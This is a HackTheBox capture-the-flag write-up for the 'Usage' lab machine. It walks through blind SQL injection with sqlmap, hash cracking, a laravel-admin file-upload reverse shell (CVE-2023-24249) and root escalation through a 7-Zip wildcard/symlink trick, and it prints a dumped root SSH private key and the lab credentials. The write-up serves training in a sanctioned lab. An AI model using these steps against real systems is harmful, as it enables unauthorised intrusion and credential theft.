#HacktheBox 


![](images/Pasted%20image%2020240705224749.png)
![](images/Pasted%20image%2020240705224807.png)

Starting with Nmap to scan open ports:

```bash
nmap -sT -Pn -p- --min-rate 10000 10.10.11.18
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 22:19 IST
Warning: 10.10.11.18 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.18
Host is up (0.22s latency).
Not shown: 65264 closed tcp ports (conn-refused), 269 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.37 seconds
```

Now scanning for UDP ports: No UDP ports active.

Running full nmap scan:

```bash
sudo nmap -sC -sV -p22,80 10.10.11.18 -oN nmap.txt      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 22:21 IST
Nmap scan report for 10.10.11.18
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.90 seconds
```

After that i did dir enum but no use then subdomain enum:

```bash
ffuf -u http://10.10.11.18 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.usage.htb" -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.18
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.usage.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

admin                   [Status: 200, Size: 3304, Words: 493, Lines: 89, Duration: 720ms]

```

Here i after adding it to my host file i see there is an admin page.

![](images/Pasted%20image%2020240610225017.png)




![](images/Pasted%20image%2020240705230312.png)

here we can see conformation of SQL injection Vuln.

So capturing the request in Burpsuite .

![](images/Pasted%20image%2020240706000348.png)

Then using sqlmap to above `req.txt:

```bash
sqlmap -r req.txt --level 5 --risk 3 -p email --batch 
```

![](images/Pasted%20image%2020240706000115.png)

```bash
sqlmap -r request.txt --level 5 --risk 3 -p email --batch --dbs --threads 10

sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog --threads 10

sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --threads 10
```

It's blind sql so it take way more time:

![](images/Pasted%20image%2020240706174546.png)

Here we get hash of admin:

```bash
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+----------+--------------------------------------------------------------+
```

Using `hydra` to crack hash:

```bash
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![](images/Pasted%20image%2020240706174957.png)

Password cracked successfully : `whatever1`

Now login to the admin panel through `admin` and `whatever1`.

![](images/Pasted%20image%2020240705233152.png)

Here we see laravel-admin version:

![](images/Pasted%20image%2020240706002015.png)

the `auth/settings` allow the user to change the profile picture.


Here we see admin interface and the version of `larvavel-admin1.8.18`.

So quickly search exploit for this version. 

We get info about the exploit (CVE-2023-24249) from [laravel-admin Exploit](https://github.com/advisories/GHSA-g857-47pm-3r32)

Best POC - [CVE-2023-24249 | flyD](https://flyd.uk/post/cve-2023-24249/)

# laravel-admin has Arbitrary File Upload vulnerability So crafting a arbitrary php rev shell code.


Here i try to create a new user with Admin roles but it won't work so i try to edit admin profile:

Here i try Various method but most of them not works at last:

`1- First upload a .jpg file in which php rev shell payload contains.`

![](images/Pasted%20image%2020240706172354.png)

Here we can see we upload `rev.jpg`.

`2- Intercept the request and change file name = rev.php.jpg.php`

`3- Forward the Request`

![](images/Pasted%20image%2020240706172500.png)


`4- Here we see we successfully upload rev.php.jpg.php`

![](images/Pasted%20image%2020240706172040.png)

`5- If we see our Listner we get a rev shell:`

![](images/Pasted%20image%2020240706173429.png)

Checking user `dash`

```bash
$ ls -la
total 52
drwxr-x--- 6 dash dash 4096 Jul  5 12:06 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Jul  5 12:06 .monit.pid
-rw------- 1 dash dash 1192 Jul  5 12:05 .monit.state
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Jul  5 07:59 user.txt

```

Here i check all of them and i get something interesting:

![](images/Pasted%20image%2020240706174024.png)
Here i get some password `3nc0d3d_pa$$w0rd`

I first hit guess to try this passwd to root although i know it will not work:

```bash
$ su root
Password: 3nc0d3d_pa$$w0rd
su: Authentication failure
```

So i try to ssh `xander` with this password:

```bash
ssh xander@10.10.11.18                                                                                                     
The authenticity of host '10.10.11.18 (10.10.11.18)' can't be established.
ED25519 key fingerprint is SHA256:4YfMBkXQJGnXxsf0IOhuOJ1kZ5c1fOLmoOGI70R/mws.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yse
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.11.18' (ED25519) to the list of known hosts.
xander@10.10.11.18's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

xander@usage:~$ whoami
xander

```

Here it works!

# **Prev Esc**

Trying `sudo -l`:

```bash
xander@usage:/$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management

```

Here we see xander can run `/usr/bin/usage_management` with root priv:

```bash
xander@usage:/$ strings /usr/bin/usage_management
```

Here in the output we see Wildcard * and i immediately search it in hacktricks:

![](images/Pasted%20image%2020240706180419.png)

Reference: 
[Wildcards Spare tricks | HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)

![](images/Pasted%20image%2020240706180324.png)

Here we get a good explanation:

Commands:

```bash
sudo /usr/bin/usage_management
Choose an option:
Project Backup
Backup MySQL data
Reset admin password

Select 1
```

![](images/Pasted%20image%2020240706180744.png)

```bash
cd /var/www/html/
touch '@root.txt'
ln -s -r /root/root.txt root.txt
sudo /usr/bin/usage_management #Opcion 1 (Project Backup)
```

![](images/Pasted%20image%2020240706180854.png)

Here we can see we get root.txt:

# **Alternative Method to get root**

Instead of just seeing `root.txt` We can try for id_rsa key.

```bash
xander@usage:/var/www/html$  touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ ls -la
total 16
drwxrwxrwx  4 root   xander 4096 Jul  5 12:42 .
drwxr-xr-x  3 root   root   4096 Apr  2 21:15 ..
-rw-rw-r--  1 xander xander    0 Jul  5 12:42 @id_rsa
lrwxrwxrwx  1 xander xander   17 Jul  5 10:06 id_rsa -> /root/.ssh/id_rsa
drwxrwxr-x 13 dash   dash   4096 Apr  2 21:15 project_admin
lrwxrwxrwx  1 xander xander   22 Jul  5 12:35 root.txt -> ../../../root/root.txt
drwxrwxr-x 12 dash   dash   4096 Apr  2 21:15 usage_blog

```

```bash
xander@usage:/var/www/html$  sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1
```

```bash

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54881267

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----

2984 folders, 17962 files, 113881880 bytes (109 MiB)               

Updating archive: /var/backups/project.zip

Items to compress: 20946

                                                                               
Files read from disk: 17962
Archive size: 54881267 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7

```

Here we get private ssh key:
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
----------------

```

Now save this and give necessary permissions:

```bash
chmod 600 root.key 
```

```bash
ssh -i root.key root@10.10.11.18     
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

root@usage:~# whoami
root
root@usage:~# cat root.txt
710300a019ecfc0ff3eab7d0b39e1073
```

Here in this way we get root shell:

# **References:**

https://flyd.uk/post/cve-2023-24249/ --> Lavarel PHP reverse shell

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks -> To get root.
